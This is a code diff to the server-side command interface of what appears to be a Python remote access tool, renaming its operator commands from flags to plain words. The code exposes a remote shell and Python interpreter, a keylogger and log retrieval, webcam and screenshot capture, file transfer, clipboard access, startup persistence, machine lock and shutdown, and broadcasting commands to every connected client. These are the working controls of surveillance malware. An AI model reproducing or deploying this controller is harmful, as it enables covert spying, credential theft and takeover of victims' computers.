@@ -23,30 +23,30 @@ if platform.system() != 'Windows':
 
 logging.basicConfig(level=logging.CRITICAL)
 
-INTERFACE_HELP = """--h | See this Help Message
---e | Open a shell
---i | Open Remote Python Interpreter
---g | Grab a screenshot
---w | Capture webcam
---u | User Info
---k (start) (stop) (status) | Manage Keylogger
---l | Returns log from client (includes keylogs)
---s | Transfers file to Client
---r | Transfers file to Server
---d | Download file from the web
---z (file) (dir) (unzip) | Zip Files or Folders
---c | Copies to Client Clipboard
---p | Returns Client Current Clipboard
---t (add) (remove) | Manage Startup (Windows)
---q (lock) (shutdown) (restart) | Manage Client Machine (Windows)
---x (restart) (disconnect) (close) | Manage Client Session
---b | Run Connection in Background (or CTRL-C)"""
+INTERFACE_HELP = """help | See this Help Message
+shell | Open a shell
+python | Open Remote Python Interpreter
+screenshot | Grab a screenshot
+webcam | Capture webcam
+info | User Info
+keylogger (start) (stop) (status) | Manage Keylogger
+log | Returns log from client (includes keylogs)
+send | Transfers file to Client
+receive | Transfers file to Server
+download | Download file from the web
+zip (file) (dir) (unzip) | Zip Files or Folders
+copy | Copies to Client Clipboard
+paste | Returns Client Current Clipboard
+startup (add) (remove) | Manage Startup (Windows)
+client (lock) (shutdown) (restart) | Manage Client Machine (Windows)
+session (restart) (disconnect) (close) | Manage Client Session
+back | Run Connection in Background (or CTRL-C)"""
 
-MENU_HELP = """--h | See this Help Message
---l | List connected Clients
---i (ID) | Connect to a Client
---a | Broadcast command to all connected clients
---s | Shutdown Server"""
+MENU_HELP = """help | See this Help Message
+list | List connected Clients
+open (ID) | Connect to a Client
+broadcast | Broadcast command to all connected clients
+shutdown | Shutdown Server"""
 
 
 def read_file(path: str, block_size: int = 32768) -> bytes:
@@ -565,35 +565,35 @@ class ServerCLI(Server):
         commands = command.lower().split(' ')
         command = commands[0]
         select = commands[-1]
-        if '--h' in command:
+        if command == 'help':
             print(INTERFACE_HELP)
-        elif '--e' in command:
+        elif command == 'shell':
             try:
                 self.shell(client)
             except (EOFError, KeyboardInterrupt):
                 print()
-        elif '--i' in command:
+        elif command == 'python':
             try:
                 self.python_interpreter(client)
             except (EOFError, KeyboardInterrupt):
                 print()
-        elif '--g' in command:
+        elif command == 'screenshot':
             print('Taking Screenshot...')
             result, error = client.screenshot()
             if result:
                 print('Saved Screenshot.')
             else:
                 print(f'Error Taking Screenshot: {error.decode()}')
-        elif '--w' in command:
+        elif command == 'webcam':
             print('Accessing webcam...')
             result, _ = client.webcam()
             if result:
                 print('Saved webcam image')
             else:
                 print('Webcam Capture Error')
-        elif '--u' in command:
+        elif command == 'info':
             client.info()
-        elif command == '--k':
+        elif command == 'keylogger':
             if select == 'start':
                 if client.start_keylogger():
                     print('Started Keylogger')
@@ -609,11 +609,11 @@ class ServerCLI(Server):
                     print('Stopped Keylogger')
                 else:
                     print('Keylogger ImportError')
-        elif '--l' in command:
+        elif command == 'log':
             print('Transferring log...')
             log = client.get_log()
             print(f'Log saved as: {log}')
-        elif '--s' in command:
+        elif command == 'send':
             file_to_transfer = input('File to Transfer to Client: ')
             save_as = input('Save as: ')
             print('Transferring file...')
@@ -622,7 +622,7 @@ class ServerCLI(Server):
                 print('File transferred.')
             else:
                 print(f'Error transferring file: {error}')
-        elif '--r' in command:
+        elif command == 'receive':
             file_to_transfer = input('File to Transfer to Server: ')
             save_as = input('Save as: ')
             print('Transferring file...')
@@ -631,7 +631,7 @@ class ServerCLI(Server):
                 print('File transferred.')
             else:
                 print(f'Error transferring file: {error}')
-        elif '--d' in command:
+        elif command == 'download':
             file_url = input('File URL: ')
             file_name = input('Filename: ')
             print('Downloading File...')
@@ -640,7 +640,7 @@ class ServerCLI(Server):
                 print('Downloaded file successfully')
             else:
                 print(error)
-        elif command == '--z':
+        elif command == 'zip':
             if select == 'file':
                 save_as = input('Zip Filename: ')
                 file_to_zip = input('File to Zip: ')
@@ -664,17 +664,17 @@ class ServerCLI(Server):
                     print('Unzipped Successfully.')
                 else:
                     print(error)
-        elif '--c' in command:
+        elif command == 'copy':
             text_to_copy = input('Text to copy: ')
             result, error = client.fill_clipboard(text_to_copy)
             if result:
                 print('Copied to Clipboard.')
             else:
                 print(error)
-        elif '--p' in command:
+        elif command == 'paste':
             _, output = client.clipboard()
             print(output)
-        elif command == '--t':
+        elif command == 'startup':
             if select == 'add':
                 result, error = client.add_startup()
                 if result:
@@ -687,7 +687,7 @@ class ServerCLI(Server):
                     print('Removed Client from Startup')
                 else:
                     print(error)
-        elif command == '--q':
+        elif command == 'client':
             if select == 'lock':
                 if client.lock():
                     print('Locked Client Machine')
@@ -707,7 +707,7 @@ class ServerCLI(Server):
                 else:
                     print('Restart is only available on Windows.')
                 return result
-        elif command == '--x':
+        elif command == 'session':
             if select == 'restart':
                 print('Restarting Session...')
                 client.restart_session()
@@ -723,10 +723,10 @@ class ServerCLI(Server):
                 client.close()
                 self.refresh()
                 return True
-        elif '--b' in command:
+        elif command == 'back':
             return True
         else:
-            print("Invalid command: '--h' for help.")
+            print("Invalid command: 'help' for help.")
 
     def broadcast(self, command: str) -> None:
         """ Broadcast a command to all connected Clients """
@@ -751,17 +751,17 @@ class ServerCLI(Server):
     def menu(self) -> None:
         """ Connection Selector """
         # returns None
-        print("Type '--h' for help")
+        print("Type 'help' for help")
         while True:
             try:
                 command = input('> ')
-                if command == '--h':
+                if command == 'help':
                     print(MENU_HELP)
-                elif command[:3] == '--a':
+                elif command == 'broadcast':
                     self.broadcast(input('Command to broadcast: '))
-                elif command == '--l':
+                elif command == 'list':
                     self.list_connections()
-                elif '--i' in command:
+                elif command == 'open':
                     client = self.get_target(command)
                     if client:
                         try:
@@ -774,10 +774,10 @@ class ServerCLI(Server):
                             self.refresh()
                     else:
                         print('Invalid Selection.')
-                elif command == '--s':
+                elif command == 'shutdown':
                     raise EOFError
                 else:
-                    print("Invalid command: '--h' for help.")
+                    print("Invalid command: 'help' for help.")
             except (EOFError, KeyboardInterrupt):
                 print('\nShutting down Server...')
                 self.close()
